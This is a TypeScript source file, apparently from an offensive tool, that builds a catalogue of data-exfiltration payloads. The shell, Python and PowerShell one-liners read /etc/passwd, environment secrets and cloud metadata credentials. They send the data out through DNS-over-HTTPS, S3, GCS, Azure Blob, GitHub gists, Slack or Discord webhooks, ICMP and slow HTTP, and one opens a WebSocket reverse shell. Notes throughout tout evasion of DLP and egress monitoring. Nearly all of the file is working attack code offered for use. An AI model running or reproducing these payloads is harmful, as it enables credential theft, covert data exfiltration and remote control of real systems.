export interface EchoPayload {
  id:       string;
  name:     string;
  category: string;
  protocol: "dns" | "http" | "https" | "icmp" | "ws" | "cloud" | "stealth";
  os:       "linux" | "windows" | "any";
  stealth:  1 | 2 | 3 | 4 | 5;
  command:  string;
  notes:    string;
}

function oobHost(u: string): string {
  try { return new URL(u).hostname; } catch { return "oob.nexusforge.local"; }
}

export function buildDoHTunnelPayloads(domain: string, token: string): EchoPayload[] {
  const h = domain || "oob.nexusforge.local";
  return [
    {
      id:"doh_curl_cloudflare", name:"DoH via Cloudflare (curl)", category:"DNS-over-HTTPS",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(cat /etc/passwd|base64 -w0 2>/dev/null|head -c200); curl -sk -H 'accept: application/dns-json' "https://cloudflare-dns.com/dns-query?name=$(echo $_D|tr '+/=' '-_~').${token}.${h}&type=TXT" 2>/dev/null &`,
      notes:"Exfils via DoH to Cloudflare — blends into normal HTTPS traffic. DNS monitoring is bypassed entirely.",
    },
    {
      id:"doh_curl_google", name:"DoH via Google (curl)", category:"DNS-over-HTTPS",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id|base64 -w0 2>/dev/null|tr '+/=' '-_~'); curl -sk "https://dns.google/resolve?name=${token}.${h}&type=A" -H 'accept: application/dns-json' 2>/dev/null; curl -sk "https://dns.google/resolve?name=$_D.g.${token}.${h}&type=TXT" 2>/dev/null &`,
      notes:"Google DoH resolver — legitimate HTTPS traffic to 8.8.8.8. Not flagged by most egress filters.",
    },
    {
      id:"doh_python", name:"DoH Python (base64 chunked)", category:"DNS-over-HTTPS",
      protocol:"https", os:"linux", stealth:5,
      command:`python3 -c "
import urllib.request,base64,os,time,json
data=b'\\n'.join([open(f,'rb').read() for f in ['/etc/passwd','/proc/self/environ'] if os.path.exists(f)])
enc=base64.urlsafe_b64encode(data).decode().rstrip('=')
for i in range(0,min(len(enc),400),50):
  chunk=enc[i:i+50]
  try:
    r=urllib.request.urlopen(f'https://cloudflare-dns.com/dns-query?name={chunk}.{i}.${token}.${h}&type=TXT',timeout=4)
  except:pass
  time.sleep(0.1)
" 2>/dev/null &`,
      notes:"Chunked DoH exfil in 50-char segments — /etc/passwd + /proc/self/environ over Cloudflare HTTPS.",
    },
    {
      id:"doh_windows_ps", name:"DoH Windows PowerShell", category:"DNS-over-HTTPS",
      protocol:"https", os:"windows", stealth:5,
      command:`powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String))).Replace('+','-').Replace('/','_').Replace('=','');$u='https://cloudflare-dns.com/dns-query?name='+$d.Substring(0,[Math]::Min(60,$d.Length))+'.${token}.${h}&type=TXT';try{Invoke-WebRequest $u -UseBasicParsing -EA 0}catch{}"`,
      notes:"Windows env vars exfil via Cloudflare DoH — looks like normal HTTPS to 1.1.1.1.",
    },
    {
      id:"doh_cert_transparency", name:"CT Log covert channel", category:"Certificate-Transparency",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id|base64 -w0|tr -d '='|head -c60); openssl req -new -newkey rsa:512 -nodes -subj "/CN=$_D.${h}/O=${token}" -out /tmp/.csr 2>/dev/null; curl -sk -X POST https://acme-v02.api.letsencrypt.org/directory 2>/dev/null|grep -o 'newNonce.*' &`,
      notes:"Encodes data in TLS certificate CN field — visible in CT logs. Bypasses all layer-7 inspection.",
    },
  ];
}

export function buildCloudStorageExfil(lhost: string, token: string): EchoPayload[] {
  return [
    {
      id:"cloud_aws_s3_put", name:"AWS S3 presigned PUT (no SDK)", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:4,
      command:`_ROLE=$(curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); _CREDS=$(curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_ROLE" 2>/dev/null); _KEY=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d['AccessKeyId'])" 2>/dev/null); _SEC=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d['SecretAccessKey'])" 2>/dev/null); _TOK=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d['Token'])" 2>/dev/null); (id;uname -a;env|grep -iE '(pass|secret|key|token|api)') | curl -sk -X PUT -H "x-amz-security-token: $_TOK" -H "x-amz-content-sha256: UNSIGNED-PAYLOAD" --upload-file - "https://s3.amazonaws.com/${token}-nx/$(hostname)-$(date +%s).txt" 2>/dev/null &`,
      notes:"Uses instance IAM role creds to PUT exfil data into S3 bucket. Looks like legitimate AWS SDK traffic.",
    },
    {
      id:"cloud_gcs_upload", name:"GCP GCS — upload via metadata token", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:4,
      command:`_TOK=$(curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null); (id;uname -a;env) | curl -sk -X POST -H "Authorization: Bearer $_TOK" -H "Content-Type: text/plain" "https://storage.googleapis.com/upload/storage/v1/b/${token}/o?uploadType=media&name=$(hostname).txt" --data-binary @- 2>/dev/null &`,
      notes:"GCP service account token fetched from metadata API, then used to upload exfil to GCS bucket.",
    },
    {
      id:"cloud_azure_blob", name:"Azure Blob Storage SAS upload", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:4,
      command:`_TOK=$(curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null); (id;env) | curl -sk -X PUT -H "Authorization: Bearer $_TOK" -H "x-ms-blob-type: BlockBlob" "https://${token}.blob.core.windows.net/nx/$(hostname).txt" --data-binary @- 2>/dev/null &`,
      notes:"Azure managed identity token → Blob Storage upload. Blends with legitimate Azure SDK traffic.",
    },
    {
      id:"cloud_github_gist", name:"GitHub Gist covert drop", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_DATA=$(id;uname -a;env|grep -iE '(pass|secret|key|token|api)'|head -20); curl -sk -X POST https://api.github.com/gists -H "Authorization: token ${token}" -H "Content-Type: application/json" -d "{\\"public\\":false,\\"files\\":{\\"nx.txt\\":{\\"content\\":\\"$(echo "$_DATA"|base64 -w0)\\"}}}" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin).get('html_url',''))" 2>/dev/null &`,
      notes:"Creates a secret GitHub Gist with exfil data — uses GitHub PAT as C2 token. HTTPS to github.com.",
    },
    {
      id:"slack_webhook_exfil", name:"Slack Webhook C2 drop", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_MSG=$(id;hostname;whoami;ip addr 2>/dev/null||ifconfig 2>/dev/null); curl -sk -X POST "https://hooks.slack.com/services/${token}" -H 'Content-type: application/json' --data "{\\"text\\":\\"$(echo "$_MSG"|head -c3000|base64 -w0)\\"}" 2>/dev/null &`,
      notes:"Posts base64-encoded recon data to a Slack incoming webhook. Traffic looks like normal Slack API calls.",
    },
    {
      id:"discord_webhook_exfil", name:"Discord Webhook covert channel", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_MSG=$(id;hostname;env|grep -iE '(pass|secret|key|token)'); curl -sk -X POST "https://discord.com/api/webhooks/${token}" -H 'Content-Type: application/json' -d "{\\"content\\":\\"$(echo "$_MSG"|base64 -w0|head -c1900)\\"}" 2>/dev/null &`,
      notes:"Uses Discord webhook as covert drop — HTTPS to discord.com, indistinguishable from game client traffic.",
    },
  ];
}

export function buildIcmpTunnelPayloads(lhost: string, token: string): EchoPayload[] {
  return [
    {
      id:"icmp_ping_exfil", name:"ICMP data exfil via ping payload", category:"ICMP-Tunnel",
      protocol:"icmp", os:"linux", stealth:4,
      command:`_D=$(id|base64 -w0|head -c48); python3 -c "import subprocess,time; [subprocess.run(['ping','-c1','-s','48','-p','$(printf '%s' \\"$_D\\" | xxd -p | head -c48)','-W','1','${lhost}'],capture_output=True) for _ in range(3)]" 2>/dev/null &`,
      notes:"Encodes data in ICMP ping payload bytes. Useful when all TCP/UDP ports are blocked.",
    },
    {
      id:"icmp_python_raw", name:"Python raw ICMP tunnel", category:"ICMP-Tunnel",
      protocol:"icmp", os:"linux", stealth:4,
      command:`python3 -c "
import socket,struct,os,time
def cksum(d):
  s=0
  for i in range(0,len(d),2):
    w=d[i]+(d[i+1]<<8 if i+1<len(d) else 0)
    s=(s+w)&0xffff
  return ~s&0xffff
data=os.popen('id && hostname && whoami').read().encode()[:56]
hdr=struct.pack('!BBHHH',8,0,0,1,1)
hdr=struct.pack('!BBHHH',8,0,cksum(hdr+data),1,1)
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
[s.sendto(hdr+data,('${lhost}',0)) for _ in range(3)]
s.close()
" 2>/dev/null &`,
      notes:"Python raw socket ICMP — sends recon data in ICMP payload. Requires CAP_NET_RAW or root.",
    },
  ];
}

export function buildSlowPostExfil(cbUrl: string, token: string): EchoPayload[] {
  const cb = `${cbUrl}/${token}`;
  return [
    {
      id:"slow_http_chunked", name:"Slow chunked POST (anti-NGFW timing)", category:"Stealth-HTTP",
      protocol:"http", os:"linux", stealth:4,
      command:`_D=$(cat /etc/passwd 2>/dev/null|base64 -w0); for i in $(seq 0 50 ${"`"}echo $_D|wc -c${"`"}); do printf '%s' "${"`"}echo $_D|cut -c$((i+1))-$((i+50))${"`"}" | curl -sk -X POST "${cb}?c=$i" --data-binary @- -H "Transfer-Encoding: chunked" 2>/dev/null; sleep 0.5; done &`,
      notes:"Slow chunked transfer — breaks exfil into 50-char chunks with 500ms delay. Evades volume-based DLP.",
    },
    {
      id:"http2_server_push_emu", name:"HTTP timing covert channel", category:"Stealth-HTTP",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id|base64 -w0); python3 -c "
import time,urllib.request
data='${"`"}id && hostname${"`"}'
encoded=[ord(c) for c in data]
base_url='${cb}?t='
for bit in ''.join(format(b,'08b') for b in encoded[:16]):
  t0=time.time()
  try:urllib.request.urlopen(base_url+str(int(time.time())),timeout=2)
  except:pass
  elapsed=time.time()-t0
  time.sleep(0.5 if bit=='1' else 0.1)
" 2>/dev/null &`,
      notes:"Timing covert channel — encodes data in inter-packet delays. Bypasses content inspection completely.",
    },
    {
      id:"websocket_tunnel", name:"WebSocket reverse tunnel", category:"WebSocket",
      protocol:"ws", os:"linux", stealth:3,
      command:`python3 -c "
import socket,threading,subprocess,base64,json,time
def ws_handshake(s,host,port,path):
  key=base64.b64encode(b'nexusforge12345!').decode()
  s.send(f'GET {path} HTTP/1.1\r\nHost:{host}:{port}\r\nUpgrade:websocket\r\nConnection:Upgrade\r\nSec-WebSocket-Key:{key}\r\nSec-WebSocket-Version:13\r\n\r\n'.encode())
  s.recv(4096)
s=socket.socket()
try:
  s.connect(('${cbUrl.replace(/https?:\/\//, "").split("/")[0].split(":")[0]}',80))
  ws_handshake(s,'${cbUrl.replace(/https?:\/\//, "").split("/")[0].split(":")[0]}',80,'/${token}/ws')
  while True:
    cmd=s.recv(1024).decode(errors='ignore').strip()
    if not cmd:break
    out=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=10).stdout
    s.send(out.encode())
except:pass
finally:s.close()
" 2>/dev/null &`,
      notes:"Full WebSocket C2 channel — upgrades HTTP to WS, receives commands, sends stdout back. Encrypted via TLS if using wss://.",
    },
  ];
}

export function buildAllEchoPayloads(cbUrl: string, token: string): EchoPayload[] {
  const host = oobHost(cbUrl);
  return [
    ...buildDoHTunnelPayloads(host, token),
    ...buildCloudStorageExfil(cbUrl, token),
    ...buildIcmpTunnelPayloads(host, token),
    ...buildSlowPostExfil(cbUrl, token),
  ];
}
